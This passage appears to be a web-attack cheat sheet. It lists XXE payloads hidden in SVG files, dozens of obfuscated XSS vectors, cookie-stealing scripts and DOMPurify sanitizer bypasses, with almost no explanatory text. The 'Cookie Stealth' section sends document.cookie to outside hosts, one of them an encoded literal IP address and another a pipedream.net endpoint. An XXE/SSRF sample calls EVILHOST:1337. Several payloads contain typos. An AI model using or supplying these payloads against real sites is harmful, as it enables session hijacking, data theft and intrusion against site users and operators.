svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">scrit</span>&gt;</span>void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">Constructor</span><br><span class="line">&#123;&#123;+constructor.constructor(&quot;alert(document.cookie)&quot;)()+&#125;&#125;</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;]]<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Iframe-Sandbox-Bypass"><a href="#Iframe-Sandbox-Bypass" class="headerlink" title=" Iframe Sandbox Bypass"></a><span style="color:#21C587"></span> Iframe Sandbox Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 